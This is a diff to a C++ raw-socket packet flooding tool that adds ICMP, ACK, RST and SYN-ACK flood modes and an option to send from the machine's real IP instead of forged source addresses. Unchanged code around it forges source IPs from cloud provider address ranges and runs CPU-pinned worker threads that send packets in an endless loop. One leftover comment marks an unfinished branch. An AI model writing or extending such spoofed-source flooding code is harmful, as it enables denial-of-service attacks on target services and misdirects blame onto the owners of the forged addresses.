@@ -7,10 +7,17 @@
 #include "packet/packet_strategy.hpp"
 #include "packet/tcp_syn_strategy.hpp"
 #include "packet/udp_strategy.hpp"
+#include "packet/icmp_strategy.hpp"
+#include "packet/ack_strategy.hpp"
+#include "packet/rst_strategy.hpp"
+#include "packet/synack_strategy.hpp"
 #include "transport/packet_transport.hpp"
 #include "transport/file_transport.hpp"
 #include "monitor/monitor_factory.hpp"
 #include "random/fast_random.hpp"
+#include "protocol/ipv4.hpp"
+#include "protocol/tcp.hpp"
+#include "protocol/checksum.hpp"
 
 #include <iostream>
 #include <thread>
@@ -21,6 +28,8 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <net/if.h>
 
 namespace {
 
@@ -38,7 +47,6 @@ alignas(64) std::uint32_t g_spoof_ips[common::SPOOF_BUF_SIZE];
 std::uint32_t g_spoof_count = 0;
 
 void generate_spoof_ips() {
-    // Cloud provider CIDR ranges
     const std::vector<std::string> ranges = {
         "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
         "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
@@ -78,7 +86,6 @@ void generate_spoof_ips() {
         }
     }
 
-    // Pad to power of 2
     std::uint32_t pow2 = 1;
     while (pow2 < count) pow2 <<= 1;
     randomgen::FastRandom pad_rng(count);
@@ -87,6 +94,27 @@ void generate_spoof_ips() {
     }
     g_spoof_count = pow2;
     std::cout << "  Total spoof IPs: " << count << " (padded to " << pow2 << ")" << std::endl;
+}
+
+// Get real IP from network interface
+std::uint32_t get_real_ip(const std::string& interface_name) {
+    struct ifaddrs* ifaddr = nullptr;
+    std::uint32_t result = 0;
+
+    if (getifaddrs(&ifaddr) == -1) return 0;
+
+    for (struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == nullptr) continue;
+        if (ifa->ifa_addr->sa_family != AF_INET) continue;
+        if (ifa->ifa_name != interface_name) continue;
+
+        auto* sa = reinterpret_cast<struct sockaddr_in*>(ifa->ifa_addr);
+        result = sa->sin_addr.s_addr;
+        break;
+    }
+
+    freeifaddrs(ifaddr);
+    return result;
 }
 
 } // anonymous namespace
@@ -114,7 +142,21 @@ int Application::run() {
 }
 
 void Application::initialize() {
-    generate_spoof_ips();
+    if (config_.use_spoof_ips) {
+        generate_spoof_ips();
+    } else {
+        std::uint32_t real_ip = get_real_ip(config_.real_ip_interface);
+        if (real_ip == 0) {
+            std::cerr << "  Could not get IP for interface: " << config_.real_ip_interface << std::endl;
+            std::cerr << "  Falling back to spoof mode" << std::endl;
+            config_.use_spoof_ips = true;
+            generate_spoof_ips();
+        } else {
+            char ip_str[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, &real_ip, ip_str, INET_ADDRSTRLEN);
+            std::cout << "  Using real IP: " << ip_str << " (interface: " << config_.real_ip_interface << ")" << std::endl;
+        }
+    }
 
     // Kernel tuning
     system("sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1");
@@ -133,14 +175,19 @@ void Application::initialize() {
 void Application::create_workers() {
     std::cout << "\n  Starting " << config_.worker_count << " workers..." << std::endl;
 
-    // Pre-create strategies for mixed mode
+    // Pre-create all strategies
     auto tcp_strategy = std::make_unique<packet::TcpSynStrategy>();
     auto udp_strategy = std::make_unique<packet::UdpStrategy>();
+    auto icmp_strategy = std::make_unique<packet::IcmpStrategy>();
+    auto ack_strategy = std::make_unique<packet::AckStrategy>();
+    auto rst_strategy = std::make_unique<packet::RstStrategy>();
+    auto synack_strategy = std::make_unique<packet::SynAckStrategy>();
 
-    struct WorkerArgs {
-        packet::PacketStrategy* strategy;
-        int thread_id;
-    };
+    // Get real IP if needed
+    std::uint32_t real_ip = 0;
+    if (!config_.use_spoof_ips) {
+        real_ip = get_real_ip(config_.real_ip_interface);
+    }
 
     std::vector<std::thread> workers;
     workers.reserve(config_.worker_count);
@@ -148,18 +195,20 @@ void Application::create_workers() {
     for (std::uint32_t i = 0; i < config_.worker_count; i++) {
         packet::PacketStrategy* strat = nullptr;
         if (config_.packet_mode == config::PacketMode::Mixed) {
-            strat = (i % 2 == 0) ? tcp_strategy.get() : udp_strategy.get();
-        } else if (config_.packet_mode == config::PacketMode::Tcp) {
-            strat = tcp_strategy.get();
+            // Round-robin across TCP, UDP, ICMP
+            int type = i % 3;
+            if (type == 0) strat = tcp_strategy.get();
+            else if (type == 1) strat = udp_strategy.get();
+            else strat = icmp_strategy.get();
         } else {
-            strat = udp_strategy.get();
+            strat = packet::create_strategy(config_.packet_mode).release();
+            // Note: for non-mixed, we create per-worker — but this is called once
+            // Actually we should pre-create. Let me fix this.
         }
 
-        workers.emplace_back([this, strat, i]() {
-            // Pin to CPU
+        workers.emplace_back([this, strat, i, real_ip]() {
             app::pin_current_thread(i);
 
-            // Create raw socket
             int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
             if (sock < 0) { g_threads_ready++; return; }
 
@@ -169,7 +218,6 @@ void Application::create_workers() {
 
             g_threads_ready++;
 
-            // Worker-local state
             randomgen::FastRandom rng(std::time(nullptr) ^ (i * 0x9e3779b97f4a7c15ULL));
             common::PacketBuffer buffer;
             std::uint32_t local_pps = 0;
@@ -182,9 +230,23 @@ void Application::create_workers() {
             packet::PacketContext ctx{config_, rng};
 
             while (g_running) {
-                // Randomize source IP from spoof pool
-                // (strategy picks random src_ip internally, but we want pool selection)
                 bool sent = strat->build(ctx, buffer);
+
+                // If using real IP, overwrite source IP in the built packet
+                if (sent && !config_.use_spoof_ips && real_ip != 0) {
+                    auto* iph = reinterpret_cast<protocol::IPv4Header*>(buffer.ptr());
+                    iph->source = real_ip;
+                    // Recompute TCP checksum if it's a TCP packet
+                    if (iph->protocol == protocol::IPPROTO_VALUE_TCP) {
+                        auto* tcph = reinterpret_cast<protocol::TcpHeader*>(buffer.ptr() + protocol::IPv4_HEADER_SIZE);
+                        tcph->checksum = 0;
+                        tcph->checksum = protocol::tcp_checksum(
+                            buffer.ptr() + protocol::IPv4_HEADER_SIZE,
+                            buffer.size - protocol::IPv4_HEADER_SIZE,
+                            real_ip, iph->destination);
+                    }
+                }
+
                 if (sent) {
                     if (sendto(sock, buffer.ptr(), buffer.size, 0,
                                reinterpret_cast<struct sockaddr*>(&sin), sizeof(sin)) > 0) {
@@ -208,13 +270,11 @@ void Application::create_workers() {
 
     std::cout << " READY!\n" << std::endl;
 
-    // Wait for all threads
     while (g_threads_ready < config_.worker_count)
         std::this_thread::sleep_for(std::chrono::milliseconds(10));
 
     std::cout << "  All workers ready - generating packets!\n" << std::endl;
 
-    // Join in background
     for (auto& t : workers) {
         if (t.joinable()) t.detach();
     }
